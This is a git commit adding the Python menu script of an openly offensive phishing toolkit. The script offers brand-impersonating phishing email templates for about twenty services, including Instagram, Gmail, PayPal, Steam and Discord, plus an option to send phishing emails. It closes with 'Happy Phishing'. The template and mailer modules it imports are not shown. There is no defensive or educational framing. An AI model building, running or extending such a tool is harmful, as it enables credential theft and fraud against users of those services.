82f37ceca90832b56ea05c3bd4326c95e0406d30
Nixie_Bytes Security Team <98546817+NixieBytes@users.noreply.github.com>
2022-06-05 17:01:40 +0530

    Add files via upload

---
+++ phishytemplate.py
@@ -0,0 +1,133 @@
+#Normal Import
+import time
+import os
+import sys
+
+#emails:
+from Core.eletter import Instagram
+from Core.eletter import Facebook
+from Core.eletter import Gmail
+from Core.eletter import Twitter
+from Core.eletter import AskFM
+from Core.eletter import Webhost000
+from Core.eletter import Blockchain
+from Core.eletter import Spotify
+from Core.eletter import Rockstar
+from Core.eletter import Dreamteam
+from Core.eletter import RiotGames
+from Core.eletter import Steam
+from Core.eletter import Gamehag
+from Core.eletter import GmailActivity
+from Core.eletter import SnapchatSimple
+from Core.devicemenu import Linkedin
+from Core.devicemenu import Dropbox
+from Core.ipmenu import Discord
+from Core.ipmenu import Paypal1
+from Core.ipmenu import Snapchat
+
+#EmailSender:
+from Core.mailer import NormalEmail
+
+red = ("\033[1;31;40m")
+green = ("\033[1;32;40m")
+white = ("\033[1;37;40m")
+blue = ("\033[1;34;40m")
+
+os.system("clear")
+print(green + """
+██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗░░░██╗  ████████╗███████╗███╗░░░███╗██████╗░██╗░░░░░░█████╗░████████╗███████╗
+██╔══██╗██║░░██║██║██╔════╝██║░░██║╚██╗░██╔╝  ╚══██╔══╝██╔════╝████╗░████║██╔══██╗██║░░░░░██╔══██╗╚══██╔══╝██╔════╝
+██████╔╝███████║██║╚█████╗░███████║░╚████╔╝░  ░░░██║░░░█████╗░░██╔████╔██║██████╔╝██║░░░░░███████║░░░██║░░░█████╗░░
+██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║░░╚██╔╝░░  ░░░██║░░░██╔══╝░░██║╚██╔╝██║██╔═══╝░██║░░░░░██╔══██║░░░██║░░░██╔══╝░░
+██║░░░░░██║░░██║██║██████╔╝██║░░██║░░░██║░░░  ░░░██║░░░███████╗██║░╚═╝░██║██║░░░░░███████╗██║░░██║░░░██║░░░███████╗
+╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░  ░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝ """)
+
+time.sleep(0.5)
+
+print(green + white + "                     :*: Tool Designed By Nixie_Bytes Security Team :*:\n")
+print(white + "options:")
+print(green + "[" + white + "1" + green + "]" + white + " Instagram" + green + "			[" + white + "11" + green + "]" + white + " Paypal")
+print(green + "[" + white + "2" + green + "]" + white + " Facebook" + green + "			[" + white + "12" + green + "]" + white + " Discord")
+print(green + "[" + white + "3" + green + "]" + white + " Gmail" + green + "			[" + white + "13" + green + "]" + white + " Spotify")
+print(green + "[" + white + "4" + green + "]" + white + " Gmail (simple)" + green + "		[" + white + "14" + green + "]" + white + " Blockchain")
+print(green + "[" + white + "5" + green + "]" + white + " Twitter" + green + "			[" + white + "15" + green + "]" + white + " RiotGames")
+print(green + "[" + white + "6" + green + "]" + white + " Snapchat" + green + "			[" + white + "16" + green + "]" + white + " Rockstar")
+print(green + "[" + white + "7" + green + "]" + white + " Snapchat (simple)" + green + "		[" + white + "17" + green + "]" + white + " AskFM")
+print(green + "[" + white + "8" + green + "]" + white + " Steam" + green + "			[" + white + "18" + green + "]" + white + " 000Webhost")
+print(green + "[" + white + "9" + green + "]" + white + " Dropbox" + green + "			[" + white + "19" + green + "]" + white + " Dreamteam")
+print(green + "[" + white + "10" + green + "]" + white + " Linkedin" + green + "			[" + white + "20" + green + "]" + white + " Gamehag")
+print(green + "-----------------------------------------------------------------------")
+print(green + "[" + white + "30" + green + "]" + white + " Send Phishing Email")
+print(green + "[" + white + "99" + green + "]" + red + " EXIT")
+
+print(green)
+mailPick = int(input("root@Phishy_Template:~ " + white))
+
+if mailPick == 1:
+	Instagram()
+
+elif mailPick == 2:
+	Facebook()
+
+elif mailPick == 3:
+	Gmail()
+
+elif mailPick == 4:
+	GmailActivity()
+
+elif mailPick == 5:
+	Twitter()
+
+elif mailPick == 6:
+	Snapchat()
+
+elif mailPick == 7:
+	SnapchatSimple()
+
+elif mailPick == 8:
+	Steam()
+
+elif mailPick == 9:
+	Dropbox()
+
+elif mailPick == 10:
+	Linkedin()
+
+elif mailPick == 11:
+	Paypal1()
+
+elif mailPick == 12:
+	Discord()
+
+elif mailPick == 13:
+	Spotify()
+
+elif mailPick == 14:
+	Blockchain()
+
+elif mailPick == 15:
+	RiotGames()
+
+elif mailPick == 16:
+	Rockstar()
+
+elif mailPick == 17:
+	AskFM()
+
+elif mailPick == 18:
+	Webhost000()
+
+elif mailPick == 19:
+	Dreamteam()
+
+elif mailPick == 20:
+	Gamehag()
+
+elif mailPick == 30:
+	NormalEmail()
+
+elif mailPick == 99:
+	os.system("clear")
+	print("Black_Skull Hackers Team")
+	print("Happy Phishing")
+	sys.exit()
